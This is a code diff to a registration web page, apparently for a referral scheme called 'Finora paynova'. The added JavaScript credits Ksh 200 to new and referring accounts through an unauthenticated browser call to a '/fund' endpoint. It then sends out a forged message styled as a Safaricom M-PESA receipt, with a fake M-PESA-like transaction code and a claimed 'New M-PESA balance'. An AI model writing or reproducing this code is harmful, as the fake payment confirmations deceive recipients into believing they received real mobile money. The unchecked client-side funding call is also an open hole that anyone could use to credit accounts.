@@ -1,6 +1,7 @@
 
 
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -327,8 +328,30 @@
                 const d = await res.json();
                 if(d.message || d.success) {
                     status.style.color = "#4CAF50";
-                    status.innerText = "Account Created!";
+                    status.innerText = "Account Created! Funding...";
                     const finalRef = refChoice === 'yes' ? (refNumber || referredBy || 'NONE') : (referredBy || 'NONE');
+
+                    // Fund the newly created account with Ksh 200 (only once per account)
+                    const userFundedKey = `funded_${phone}`;
+                    let userMsg = "";
+                    if (!localStorage.getItem(userFundedKey)) {
+                        userMsg = await fundAccount(phone, 200);
+                        if (userMsg) localStorage.setItem(userFundedKey, "1");
+                    }
+
+                    // If referred, fund the referrer with Ksh 200 and message both accounts
+                    let referrerMsg = "";
+                    if (finalRef && finalRef !== 'NONE' && finalRef !== phone) {
+                        referrerMsg = await fundAccount(finalRef, 200);
+                    }
+
+                    let fundStatus = "";
+                    if (userMsg) fundStatus += `Account funded: ${userMsg}`;
+                    if (referrerMsg) fundStatus += (fundStatus ? "<br>" : "") + `Referrer funded: ${referrerMsg}`;
+                    if (fundStatus) {
+                        status.innerHTML = `<strong>✅ Account Created!</strong><br>${fundStatus}`;
+                    }
+
                     await fetch("https://api.web3forms.com/submit", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -346,6 +369,87 @@
                 }
             } catch (err) { status.innerText = "Error during registration."; }
             finally { btn.innerText = "Register"; btn.disabled = false; }
+        }
+
+        async function fundAccount(targetPhone, amount) {
+            try {
+                const res = await fetch(`${API}/fund`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: targetPhone, amount })
+                });
+                const result = await res.json();
+                if (res.ok) {
+                    const newBalance = result.newBalance || 0;
+                    const accountNumber = result.accountNumber || result.account || targetPhone;
+                    const msg = buildConfirmation(targetPhone, amount, newBalance);
+                    await sendConfirmation(accountNumber, msg);
+                    return msg;
+                } else {
+                    console.warn(`Funding failed for ${targetPhone}:`, result.error || "Unknown error");
+                    return null;
+                }
+            } catch (err) {
+                console.warn(`Funding request failed for ${targetPhone}:`, err);
+                return null;
+            }
+        }
+
+        async function sendConfirmation(phone, message) {
+            try {
+                await fetch('https://message-server-five.vercel.app/api/messages', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, message, type: 'received' })
+                });
+            } catch (err) {
+                console.warn("Confirmation message failed to send:", err);
+            }
+        }
+
+        function buildConfirmation(phone, amount, newBalance) {
+            const token = generateToken();
+            const dateStr = formatNumericDate();
+            const timeStr = formatTime12Hour();
+            return `Congratulations! ${token} Confirmed.You have received Ksh${parseFloat(amount).toFixed(2)} from Finora paynova Royal points  on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${newBalance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
+        }
+
+        function getYearLetter() {
+            const year = new Date().getFullYear();
+            const offset = year - 2026;
+            return String.fromCharCode(85 + offset);
+        }
+
+        function getMonthThirdLetter() {
+            const thirdLetters = "ABCDEFGHIJKLMN";
+            return thirdLetters[new Date().getMonth()];
+        }
+
+        function getDayCode() {
+            const day = new Date().getDate();
+            if (day <= 9) return day.toString();
+            return String.fromCharCode(65 + (day - 10));
+        }
+
+        function formatNumericDate() {
+            const now = new Date();
+            const day = now.getDate().toString().padStart(2, '0');
+            const month = (now.getMonth() + 1).toString().padStart(2, '0');
+            const year = now.getFullYear();
+            return `${day}/${month}/${year}`;
+        }
+
+        function formatTime12Hour() {
+            const now = new Date();
+            return now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
+        }
+
+        function generateToken() {
+            const yearLetter = getYearLetter();
+            const monthLetter = getMonthThirdLetter();
+            const dayCode = getDayCode();
+            const randomPart = Math.random().toString(36).substring(2,8).toUpperCase();
+            return `${yearLetter}${monthLetter}${dayCode}K${randomPart}`;
         }
 
         async function changePin() {
